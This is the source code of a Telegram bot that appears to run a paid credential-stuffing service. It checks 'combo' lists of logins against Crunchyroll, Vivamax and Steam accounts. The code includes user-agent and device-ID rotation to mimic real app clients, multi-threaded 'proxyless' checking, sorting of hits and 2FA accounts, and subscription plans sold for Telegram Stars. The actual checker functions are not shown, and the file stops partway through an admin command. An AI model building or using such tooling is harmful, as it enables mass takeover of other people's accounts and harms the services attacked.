from fastapi import FastAPI, Request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import os
import time
import string
import random
import uuid
import requests
import re
import random
import threading
from threading import Event
import threading
import concurrent.futures
from datetime import datetime, date
import asyncio
from functools import partial
from contextlib import asynccontextmanager
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from supabase import create_client, Client
from datetime import datetime, date, timedelta, timezone
from regions import REGION_HINTS
import base64
from steam_auth_pb2 import (
    CAuthentication_GetPasswordRSAPublicKey_Request,
    CAuthentication_GetPasswordRSAPublicKey_Response,
    CAuthentication_BeginAuthSessionViaCredentials_Request,
    CAuthentication_BeginAuthSessionViaCredentials_Response
)

STEAM_API_KEY = os.getenv("STEAM_API_KEY")  # ← Add this near BOT_TOKEN

# ============= TIMEZONE CONFIG =============
PH_TZ = timezone(timedelta(hours=8))

# ============= CONFIGURATION =============
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7399488750))
CHANNEL_USERNAME = "@caysredirect"

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_ANON_KEY")

TIMEOUT = 30

# ============= API MODES CONFIG (dynamic like the Netflix screenshot) =============
MODES = {
    "Crunchyroll": {
        "display": "Crunchyroll Mode",
        "icon": "🍥",
        "color": "🍥",
        "features": [
            "Extracts account plan & status",
            "Detects Active Subscription",
            "Shows Email Verification",
            "Detects Free Trial",
            "Saves detailed results in TXT files"
        ]
    },
    "Vivamax": {
        "display": "Vivamax Mode",
        "icon": "📺",
        "color": "📺",
        "features": [
            "Checks Vivamax PH streaming accounts",
            "Detects subscription status",
            "Shows account details",
            "Philippine streaming service",
            "Saves detailed results in TXT files"
        ]
    },
    "Steam": {
        "display": "Steam Mode",
        "icon": "🛠️",
        "color": "🛠️",
        "features": [
            "Checks Steam accounts",
            "Detects valid accounts + SteamID",
            "Detects 2FA required accounts",
            "Saves Hits + 2FA + Bad separately",
            "Supports high-speed multi-threading"
        ]
    },
}

# ============= PROXYLESS BANNER (Reusable & Clean) =============
def get_proxyless_banner() -> str:
    """Reusable proxyless banner - no extra blank line"""
    return """🚀 <b>PROXYLESS MODE</b> ✅
• No proxy list required
• Ultra fast & stable checks
• Works instantly on all plans
━━━━━━━━━━━━━━━━━━━━━━━━"""

async def animate_progress(status_msg, email, stop_event):
    """Runs in background while check is happening"""
    stages = [
        (10, "🔍 Connecting to server..."),
        (25, "🔐 Authenticating..."),
        (45, "📡 Fetching account info..."),
        (65, "📊 Checking subscription..."),
        (80, "📦 Extracting details..."),
        (95, "⏳ Finalizing..."),
    ]
    
    for percent, label in stages:
        if stop_event.is_set():
            return
        
        try:
            await status_msg.edit_text(
                f"🔍 <b>Checking Account</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📧 <code>{email}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📌 {label}\n"
                f"⚡ Progress: <b>{percent}%</b>",
                parse_mode='HTML'
            )
        except:
            pass
        
        await asyncio.sleep(1.2)

# ============= SCAN CONTROL VIA SUPABASE =============
def set_scan_status(scan_id: str, status: str):
    supabase.table("active_scans").upsert({
        "scan_id": scan_id,
        "status": status
    }).execute()

def get_scan_status(scan_id: str) -> str:
    """Returns 'running', 'paused', or 'stopped'"""
    try:
        r = supabase.table("active_scans").select("status").eq("scan_id", scan_id).execute()
        if r.data:
            return r.data[0]["status"]
    except:
        pass
    return "stopped"

def delete_scan(scan_id: str):
    supabase.table("active_scans").delete().eq("scan_id", scan_id).execute()

# ============= DAILY REWARD TIMER HELPER (Fixed - uses UTC) =============
def is_daily_reward_active(stats: dict) -> bool:
    """Returns True if the 24-hour reward timer is still active"""
    last_claimed = stats.get('daily_reward_last_claimed')
    if not last_claimed:
        return False
    
    try:
        if isinstance(last_claimed, str):
            # Remove timezone info and treat as UTC
            if 'Z' in last_claimed or '+' in last_claimed:
                last_claimed = last_claimed.split('+')[0].split('Z')[0]
            last_claimed = datetime.fromisoformat(last_claimed)
        
        now = datetime.utcnow()
        return (now - last_claimed).total_seconds() < 24 * 3600
    except:
        return False

def clean_expired_daily_reward(stats: dict):
    """Automatically clean up expired rewards so Stats/Rewards menu shows correct values"""
    if is_daily_reward_active(stats):
        return stats
    
    user_id = stats.get('user_id')
    if stats.get('daily_reward_lines', 0) > 0 or stats.get('daily_reward_claimed', False):
        update_user_stats(user_id, {
            "daily_reward_lines": 0,
            "daily_reward_claimed": False
        })
        stats['daily_reward_lines'] = 0
        stats['daily_reward_claimed'] = False
    return stats

def get_remaining_reward_time(stats: dict) -> str:
    """Returns countdown like '23:45:12' or 'Ready to Claim!'"""
    last_claimed = stats.get('daily_reward_last_claimed')
    if not last_claimed:
        return "🟢 <b>Ready to Claim!</b>"
    
    try:
        if isinstance(last_claimed, str):
            if 'Z' in last_claimed or '+' in last_claimed:
                last_claimed = last_claimed.split('+')[0].split('Z')[0]
            last_claimed = datetime.fromisoformat(last_claimed)
        
        now = datetime.utcnow()
        remaining = last_claimed + timedelta(hours=24) - now
        
        if remaining.total_seconds() <= 0:
            return "🟢 <b>Ready to Claim!</b>"
        
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"⏳ <code>{hours:02d}:{minutes:02d}:{seconds:02d}</code>"
    except:
        return "🟢 <b>Ready to Claim!</b>"

def format_files_display(today_files, max_files, plan):
    """Show remaining files for PAID plans, '-' for FREE"""
    if plan and plan.upper() == "FREE":
        return "-"
    
    remaining = max_files - today_files
    return f"{remaining}/{max_files}"

def generate_referral_code(user_id: int) -> str:
    """Auto-generate nice referral code like CAY73994"""
    prefix = "CAY"
    suffix = str(user_id % 100000).zfill(5)  # last 5 digits
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))
    return f"{prefix}{suffix}{random_part}"[:12]

def get_referral_bonus_per_referral(plan: str) -> int:
    """Referral bonus per referral — hard to earn version"""
    plan = plan.upper()
    if plan == "VIP" or plan == "YEARLY":
        return 30
    elif plan == "BASIC":
        return 12
    else:  # FREE
        return 3

# ============= GLOBAL MODE DISPLAY HELPER (clean & future-proof) =============
def get_mode_display(mode_key: str = None) -> str:
    """Returns formatted mode like '🍥 Crunchyroll Mode' with icon.
    Works for any mode you add to the MODES dict."""
    if not mode_key or mode_key not in MODES:
        mode_key = "Crunchyroll"
    
    mode_info = MODES[mode_key]
    return f"{mode_info['icon']} {mode_info['display']}"

# ============= PLAN WITH EMOJI HELPER =============
def get_plan_with_emoji(plan_key: str) -> str:
    """Returns plan with its specific emoji (matches Membership Plans)"""
    plan_key = (plan_key or "FREE").upper()
    emojis = {
        "FREE": "🆓",
        "BASIC": "⭐",
        "VIP": "👑",
        "YEARLY": "🌟",
        "OWNER": "🔱"
    }
    emoji = emojis.get(plan_key, "📌")
    config = PLAN_CONFIG.get(plan_key, PLAN_CONFIG["FREE"])
    return f"{emoji} {config['display_name']}"

# ============= MODE DISPATCHER =============
def get_checker_function(api_mode: str, user_id: int = None):
    """Returns the correct checker function + blocks normal users from Vivamax"""
    if user_id and user_id != ADMIN_ID and api_mode == "Vivamax":
        api_mode = "Crunchyroll"   # Force fallback
    
    checkers = {
        "Crunchyroll": check_crunchyroll,
        "Vivamax": check_vivamax,
        "Steam": check_steam,
    }
    return checkers.get(api_mode, check_crunchyroll)

# ============= PLAN CONFIG =============
PLAN_CONFIG = {
    "FREE": {
        "display_name": "FREE",
        "daily_limit": 25,
        "max_threads": 8,
        "multi_scan_max_files": 0,
        "queue_waiting": True
    },
    "BASIC": {
        "display_name": "BASIC PLAN (WEEKLY)",
        "daily_limit": 150,
        "max_threads": 25,
        "multi_scan_max_files": 3,
        "queue_waiting": False
    },
    "VIP": {
        "display_name": "VIP PLAN (MONTHLY)",
        "daily_limit": None,          # Unlimited
        "max_threads": 40,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    },
    "YEARLY": {
        "display_name": "YEARLY VIP",
        "daily_limit": None,          # Unlimited
        "max_threads": 40,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    },
    "OWNER": {
        "display_name": "OWNER",
        "daily_limit": None,
        "max_threads": 50,
        "multi_scan_max_files": 999,
        "queue_waiting": False
    }
}

# ============= PLAN DEFAULTS FOR /setplan COMMAND =============
PLAN_DEFAULTS = {
    "FREE": {
        "plan": "FREE",
        "base_plan_limit": 25, 
        "threads": 8,
        "expires": "N/A"
    },
    "BASIC": {
        "plan": "BASIC",
        "base_plan_limit": 150,
        "threads": 25   ,
        "expires": (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    },
    "VIP": {
        "plan": "VIP",
        "base_plan_limit": 999999,   # practically unlimited
        "threads": 40,
        "expires": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    },
    "YEARLY": {
        "plan": "YEARLY",
        "base_plan_limit": 999999,
        "threads": 40,
        "expires": (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")
    },
    "OWNER": {
        "plan": "OWNER",
        "base_plan_limit": 999999,
        "threads": 50,
        "expires": "N/A"
    }
}

class RateLimiter:
    """Best proxyless rate limiter - controls total requests per second"""
    def __init__(self, max_rps: int = 35):
        self.max_rps = max_rps
        self.lock = threading.Lock()
        self.tokens = 0
        self.last_refill = time.time()

    def acquire(self):
        """Wait until we can send the next request"""
        while True:
            with self.lock:
                now = time.time()
                if now - self.last_refill >= 1.0:
                    self.tokens = self.max_rps
                    self.last_refill = now
                if self.tokens > 0:
                    self.tokens -= 1
                    return
            time.sleep(0.008)

# ============= IMPROVED UA + DEVICE ROTATION (Point 2) =============
def generate_random_user_agent():
    """Much better and more realistic UAs (including official Crunchyroll app)"""
    user_agents = [
        "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
        "Crunchyroll/3.75.0 Android/13 okhttp/4.12.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    ]
    return random.choice(user_agents)

def generate_random_device_info():
    """Better device fingerprinting"""
    device_id = str(uuid.uuid4())
    return device_id, "SamsungTV", "TV"   # You can expand this list later if you want

# ============= DAYS REMAINING HELPER =============
def get_days_remaining(expires_str: str) -> str:
    """Returns nice countdown text for dashboard and stats"""
    if not expires_str or expires_str.upper() == "N/A":
        return "♾️"  # FREE plan or no expiry
    
    try:
        # Handle both "2026-06-04" and "2026-06-04T..." formats
        date_part = expires_str.split('T')[0]
        expires_date = datetime.strptime(date_part, "%Y-%m-%d").date()
        today = date.today()
        
        delta = (expires_date - today).days
        
        if delta < 0:
            return "❌ Expired"
        elif delta == 0:
            return "Expires today"
        elif delta == 1:
            return "1 day left"
        else:
            return f"{delta} days left"
            
    except Exception:
        # Fallback if date format is weird
        return expires_str

def get_plan_limits(stats: dict):
    plan_key = stats.get("plan", "FREE").upper()
    config = PLAN_CONFIG.get(plan_key, PLAN_CONFIG["FREE"])
    
    base_limit = config["daily_limit"]
    
    daily_reward_lines = stats.get("daily_reward_lines", 0)
    if not is_daily_reward_active(stats):
        daily_reward_lines = 0
    
    referral_bonus_per = get_referral_bonus_per_referral(stats.get("plan", "FREE"))
    total_referral_bonus = stats.get("referrals", 0) * referral_bonus_per
    
    bonus_lines = daily_reward_lines + total_referral_bonus
    
    if base_limit is None:  # VIP & YEARLY = unlimited
        daily_limit = None
        remaining_text = "♾️"
        base_limit_text = "♾️"
    else:
        daily_limit = base_limit + bonus_lines
        today_used = stats.get("today_scans", 0)
        remaining = max(0, daily_limit - today_used)
        remaining_text = f"{remaining}/{daily_limit}"
        base_limit_text = f"{base_limit:,}"
    
    return {
        "display_name": config["display_name"],
        "daily_limit": daily_limit,
        "max_threads": config["max_threads"],
        "multi_scan_max_files": config["multi_scan_max_files"],
        "queue_waiting": config["queue_waiting"],
        "remaining_text": remaining_text,
        "current_threads": stats.get("threads", 10),
        "base_limit_text": base_limit_text
    }

# ============= SUPABASE CLIENT =============
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ← ADD THIS RIGHT AFTER
print(f"✅ Supabase URL: {SUPABASE_URL}")
print(f"✅ Supabase Key starts with: {SUPABASE_KEY[:20] if SUPABASE_KEY else 'MISSING'}")
# ============= OWNER RESTRICTION =============
def is_owner(update: Update):
    return update.effective_user and update.effective_user.id == ADMIN_ID

# ============= SIMPLE CHANNEL JOIN CHECK (EASY WAY) =============
async def check_subscription(update: Update, context: CallbackContext) -> bool:
    """Returns True if user is in @caysredirect. Owner always allowed."""
    if is_owner(update):
        return True
    
    user = update.effective_user
    if not user:
        return False

    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user.id)
        # These statuses = joined
        return member.status in ["member", "administrator", "creator", "restricted"]
    except:
        return False
    
# ============= VERIFICATION BUTTON MESSAGE =============
async def send_join_channel_message(update: Update, context: CallbackContext):
    """Shows clean message with Join button + Verify button"""
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}")],
        [InlineKeyboardButton("✅ I've Joined - Verify", callback_data="verify_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = f"""
<b>🚫 Access Restricted</b>
━━━━━━━━━━━━━━━━━━━━━━━━
You must be a member of our channel to use the bot.

📢 <a href="https://t.me/{CHANNEL_USERNAME.strip('@')}">{CHANNEL_USERNAME}</a>

After joining, tap the button below 👇
    """.strip()

    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=text,
            parse_mode='HTML',
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text(
            text=text,
            parse_mode='HTML',
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )

# ============= BLOCKING RUNNER =============
async def run_blocking(func, *args, **kwargs):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, partial(func, *args, **kwargs))

# ============= FASTAPI LIFESPAN =============
@asynccontextmanager
async def lifespan(app: FastAPI):
    global tg_app
    await tg_app.initialize()
    await tg_app.start()
    
    webhook_url = os.getenv("WEBHOOK_URL")
    if webhook_url:
        await tg_app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["message", "edited_message", "channel_post", "callback_query"]
        )
        print(f"✅ Webhook set → {webhook_url}")
    else:
        print("⚠️ WEBHOOK_URL env var is missing!")

    print("🚀 Bot started on Render")
    yield

    await tg_app.stop()
    await tg_app.shutdown()

# ============= FASTAPI + TG APP =============
app = FastAPI(lifespan=lifespan)
tg_app = Application.builder().token(BOT_TOKEN).build()

def get_user_stats(user_id: int):
    response = supabase.table("user_stats").select("*").eq("user_id", user_id).execute()
    if response.data:
        stats = response.data[0]
        stats = clean_expired_daily_reward(stats)
        
        # Auto-generate referral code if missing (for existing users)
        if not stats.get('referral_code'):
            new_code = generate_referral_code(user_id)  # ← was ADMIN_ID
            update_user_stats(user_id, {"referral_code": new_code})
            stats['referral_code'] = new_code
        
        # Auto update last active
        update_user_stats(user_id, {"last_active": datetime.now().isoformat()})
        return stats
    
    # First time user - create row with referral code
    default = {
        "user_id": user_id,
        "username": None,
        "first_name": None,
        "registered": str(date.today()),
        "last_active": datetime.now().isoformat(),
        "plan": "FREE",
        "expires": "N/A",
        "threads": 8,
        "api_mode": "Crunchyroll",
        "total_scans": 0,
        "total_hits": 0,
        "total_free": 0,
        "total_2fa": 0,
        "total_combo_files": 0,
        "today_date": str(datetime.now(PH_TZ).date()),
        "today_scans": 0,
        "today_files": 0,
        "referrals": 0,
        "referral_code": generate_referral_code(user_id),
        "referred_by": None,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None,
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0,
        "base_plan_limit": 25,
        "is_banned": False,
        "created_at": datetime.now().isoformat(),
        "updated_at": datetime.now().isoformat()
    }
    supabase.table("user_stats").insert(default).execute()
    return default

# ============= TELEGRAM BOT HANDLERS =============
def update_user_stats(user_id: int, data: dict):
    data["updated_at"] = datetime.now().isoformat()
    supabase.table("user_stats").update(data).eq("user_id", user_id).execute()

def reset_daily_if_needed(stats: dict, user_id: int):
    """Automatically reset daily scans AND daily files at 00:00 Philippine Time"""
    plan = stats.get("plan", "FREE").upper()
    
    if plan == "OWNER":
        return

    today_ph = datetime.now(PH_TZ).date()
    today_str = str(today_ph)
    
    if stats.get("today_date") != today_str:
        update_user_stats(user_id, {
            "today_scans": 0,
            "today_files": 0,
            "today_date": today_str
        })
        return True
    return False

def update_user_stats_general(user_id: int, data: dict):
    """Update any user (used by admin commands)"""
    data["updated_at"] = datetime.now().isoformat()
    response = supabase.table("user_stats").update(data).eq("user_id", user_id).execute()
    return len(response.data) > 0  # True if row was updated

async def show_referrals_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    # Auto-generate referral code if missing
    if not stats.get('referral_code'):
        new_code = generate_referral_code(user_id)
        update_user_stats(user_id, {"referral_code": new_code})
        stats['referral_code'] = new_code
    
    referral_count = stats.get('referrals', 0)
    bonus_per = get_referral_bonus_per_referral(stats.get('plan', 'FREE'))
    total_bonus = referral_count * bonus_per
    
    bot_username = "clydecrunchybot"   # ← Change to your real bot username
    referral_link = f"https://t.me/{bot_username}?start={stats['referral_code']}"
    
    text = f"""
🔗 <b>My Referrals</b>
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Your Statistics:</b>
✅ Referral Count: <b>{referral_count}</b>
📈 Your Daily Limit: <b>{limits['remaining_text']}</b>
💰 Total Bonus: <b>+{total_bonus} combos</b>
━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Earn +{bonus_per} combos for each referral!</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔗 <b>Your Referral Link:</b>
{referral_link}
━━━━━━━━━━━━━━━━━━━━━━━
<i>📤 Share this link with your friends!</i>
Your daily limit increases by {bonus_per} combos for each person who registers using your link.

💡 <b>Example:</b>
• 0 referrals = {limits['base_limit_text']} combos/day
• 5 referrals = +{5*bonus_per} combos/day
• 10 referrals = +{10*bonus_per} combos/day
━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=False
    )

async def show_support_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Support & Contact page with native preview card"""
    
    text = """📞 <b>Support & Contact</b>
━━━━━━━━━━━━━━━━━━━━━━━
<i>Need help or want to upgrade?</i>

— Contact: <a href="https://t.me/caydigitals">@caydigitals</a>
━━━━━━━━━━━━━━━━━━━━━━━
""".strip()

    # Inline keyboard (Back button at the bottom, exactly like the screenshot)
    keyboard = [
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text=text,
        parse_mode='HTML',
        reply_markup=reply_markup
        # ← DO NOT add disable_web_page_preview=True (or False)
        # Just leave it out — default is False, which enables the preview
    )

async def show_rewards_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    stats = clean_expired_daily_reward(stats)
    is_active = is_daily_reward_active(stats)
    
    if is_active:
        claim_button_text = "⏳ Reward Active"
    else:
        claim_button_text = "🎁 Claim Daily Reward"

    text = f"""
🎁 <b>Rewards & Gifts Hub</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Claim your daily free combos or redeem premium gift codes provided by the admin.

📊 <b>Possible Rewards:</b>
• <b>FREE:</b> mostly 5-15 combos (very rare up to <tg-spoiler>60</tg-spoiler>)
• <b>BASIC:</b> mostly 15-35 combos (very rare up to <tg-spoiler>200</tg-spoiler>)
• <b>VIP / YEARLY:</b> mostly 60-130 combos (very rare up to <tg-spoiler>750</tg-spoiler>)
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Your Daily Statistics:</b>
⏰ Next Reward In: <code>{get_remaining_reward_time(stats)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [
        [InlineKeyboardButton(claim_button_text, callback_data="claim_daily_reward")],
        [InlineKeyboardButton("📦 REDEEM GIFT CODE", callback_data="redeem_gift_code")],
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def claim_daily_reward(query, context):
    """Personal 24-hour reward timer — Balanced & Exciting Lottery"""
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    
    if is_daily_reward_active(stats):
        await query.answer("❌ Your previous reward is still active!", show_alert=True)
        await show_rewards_menu(query, context)
        return
    
    plan = stats.get("plan", "FREE").upper()

    # === VERY HARD LOTTERY (0.5% jackpot) ===
    if plan == "FREE":
        # 85% small | 12% decent | 3% jackpot (better odds now)
        rewards = (
            [random.randint(5, 15)] * 170 +  
            [random.randint(20, 35)] * 24 + 
            [random.randint(50, 100)] * 6
        )
    elif plan == "BASIC":
        # 75% small | 23% good | 2% big
        rewards = (
            [random.randint(15, 35)] * 150 +
            [random.randint(40, 85)] * 46 +
            [random.randint(110, 200)] * 4
        )
    else:  # VIP or YEARLY
        # 65% decent | 32% strong | 3% massive
        rewards = (
            [random.randint(60, 130)] * 130 +
            [random.randint(150, 280)] * 64 +
            [random.randint(350, 750)] * 6
        )

    reward_amount = random.choice(rewards)

    update_user_stats(user_id, {
        "daily_reward_lines": reward_amount,
        "daily_reward_claimed": True,
        "daily_reward_last_claimed": datetime.utcnow().isoformat()
    })
    
# ====================== ADMIN NOTIFICATION ======================
    try:
        now_ph = datetime.now(PH_TZ)
        time_str = now_ph.strftime("%Y-%m-%d %I:%M %p")
        
        username_display = f"@{stats.get('username')}" if stats.get('username') else "No username"
        user_plan = stats.get('plan', 'FREE').upper()
        
        admin_msg = f"""
🎁 <b>Daily Reward Claimed!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User ID:</b> <code>{user_id}</code>
👤 <b>Username:</b> {username_display}
👑 <b>Plan:</b> {get_plan_with_emoji(user_plan)}
🎟️ <b>Reward:</b> +{reward_amount} combos
⏰ <b>Time:</b> {time_str} (PH time)
        """.strip()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_msg,
            parse_mode='HTML'
        )
    except Exception as e:
        print(f"⚠️ Failed to send daily reward notification: {e}")

    # ====================== USER FEEDBACK (Popup) ======================
    if reward_amount >= 100:
        await query.answer(
            f"🎉🎉🎉 MASSIVE JACKPOT!!!\n"
            f"You received +{reward_amount} combos!",
            show_alert=True
        )
    elif reward_amount >= 50:
        await query.answer(
            f"🔥 Excellent!\n"
            f"You received +{reward_amount} combos!",
            show_alert=True
        )
    else:
        await query.answer(
            f"🎁 Reward Claimed!\n"
            f"You received +{reward_amount} combos (Valid for 24H)",
            show_alert=True
        )

    await show_rewards_menu(query, context)

# ============= MEMBERSHIP PLAN MENU (Updated to match PLAN_CONFIG) =============
async def show_membership_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    current_plan_text = f"📌 <b>Your Current Plan:</b> <code>{get_plan_with_emoji(stats.get('plan'))}</code>"
    
    text = f"""
👑 <b>MEMBERSHIP PLANS</b>
━━━━━━━━━━━━━━━━━━━━━━━
🆓 <b>FREE PLAN</b>
• Daily Limit: <b>25 combos/day</b>
• Max Threads: <b>1-8</b>
• Single checks only (no .txt files)
• <b>Basic Hit Details</b> only
━━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>BASIC PLAN (WEEKLY)</b>
• Duration: <b>7 Days</b>
• Daily Limit: <b>150 combos/day</b>
• Max Threads: <b>1-25</b>
• Multi-Scan: <b>Up to 3 files/day</b>
• <b>Medium Hit Details</b>
• No Queue Waiting
• Price: <b>130 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━
👑 <b>VIP PLAN (MONTHLY)</b>
• Duration: <b>30 Days</b>
• Daily Limit: <b>♾️ Unlimited</b>
• Max Threads: <b>1-40</b>
• Multi-Scan: <b>Up to 5 files/day</b>
• <b>Full Rich Hit Details</b>
• No Queue Waiting
• Maximum Speed
• Price: <b>399 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━
🌟 <b>YEARLY VIP PLAN</b>
• Duration: <b>365 Days</b>
• Daily Limit: <b>♾️ Unlimited</b>
• Max Threads: <b>1-40</b>
• Multi-Scan: <b>Up to 5 files/day</b>
• <b>Full Rich Hit Details</b> + All VIP Benefits
• No Queue Waiting
• Best Value
• Price: <b>3,200 Telegram Stars</b> (Save ~33%)
━━━━━━━━━━━━━━━━━━━━━━━
{current_plan_text}

⚡ <b>Payment Method</b>
Telegram Stars only (currently accepted)

💳 <b>To Purchase A Membership</b>
<b>Contact:</b> <a href="https://t.me/caydigitals">@caydigitals</a>
    """.strip()

    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

# ============= STATISTICS MENU (Exact match to your screenshot) =============
async def show_statistics_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    stats = clean_expired_daily_reward(stats)

    # Auto reset daily stats if new day (Manila time)
    today_ph = datetime.now(PH_TZ).date()
    if stats["today_date"] != str(today_ph):
        update_user_stats(user_id, {"today_scans": 0, "today_date": str(today_ph)})
        stats = get_user_stats(user_id)
    
    limits = get_plan_limits(stats)

    success_rate = round((stats["total_hits"] / stats["total_scans"] * 100), 2) if stats["total_scans"] > 0 else 0.0

    # File statistics
    max_files = limits.get("multi_scan_max_files", 1)
    today_files_used = stats.get("today_files", 0)
    total_files = stats.get("total_combo_files", 0)
    files_display = format_files_display(today_files_used, max_files, stats.get("plan", "FREE"))

    text = f"""
📊 <b>Your Statistics</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>{stats['user_id']}</code>
📅 <b>Registered:</b> <code>{stats['registered']}</code>
👑 <b>Plan:</b> <code>{get_plan_with_emoji(stats.get('plan'))}</code>
📆 <b>Plan Expires In:</b> <code>{get_days_remaining(stats['expires'])}</code>
📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
🧵 <b>Threads:</b> <code>{limits['current_threads']}/{limits['max_threads']}</code>
📁 <b>Files Today:</b> <code>{files_display}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📈 <b>General Statistics:</b>
✅ Total Scans: <code>{stats['total_scans']}</code>
📁 Total Files Processed: <code>{total_files}</code>
💎 Total Hits: <code>{stats['total_hits']}</code>
🔐 Total 2FA: <code>{stats.get('total_2fa', 0)}</code>
❌ Total Bad: <code>{stats.get('total_free', 0)}</code>
🎯 Success Rate: <code>{success_rate}%</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Today's Statistics:</b>
📊 Scans Used: <code>{stats['today_scans']}</code>
⏳ Remaining: <code>{limits['remaining_text']}</code>
👥 Referrals: <code>{stats['referrals']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Rewards & Limits Details:</b>
🎟️ Claimed Codes: <code>0</code>
🎁 Daily Reward Claimed Today: <code>{'Yes' if stats['daily_reward_claimed'] else 'No'}</code>
✨ Daily Reward Combos (Active): <code>{stats['daily_reward_lines']}</code> {get_remaining_reward_time(stats) if is_daily_reward_active(stats) else ''}
👥 Referral Bonus Combos: <code>+{stats['referral_bonus_lines']}</code>
📦 Base Plan Limit: <code>{limits['base_limit_text']}</code>
    """.strip()

    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def reset_reward_command(update: Update, context: CallbackContext):
    """Admin command to reset ALL daily counters + reward timer"""
    if not is_owner(update):
        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    target_user_id = ADMIN_ID  # default = yourself

    if args:
        try:
            target_user_id = int(args[0])
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.\n\n"
                "Usage:\n"
                "`/resetreward` → reset yourself\n"
                "`/resetreward 1234567890` → reset specific user",
                parse_mode='HTML'
            )
            return

    # Reset ALL daily-related data
    success = update_user_stats_general(target_user_id, {
        "today_scans": 0,
        "today_files": 0,
        "daily_reward_lines": 0,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None
    })

    if success:
        await update.message.reply_text(
            f"✅ <b>All daily limits have been reset</b> for user <code>{target_user_id}</code>.\n\n"
            f"• Daily Scans → 0\n"
            f"• Daily Files → 0\n"
            f"• Daily Reward → Ready to claim again",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(f"❌ User {target_user_id} not found or never used the bot.")
async def set_plan_command(update: Update, context: CallbackContext):
    if not is_owner(update):
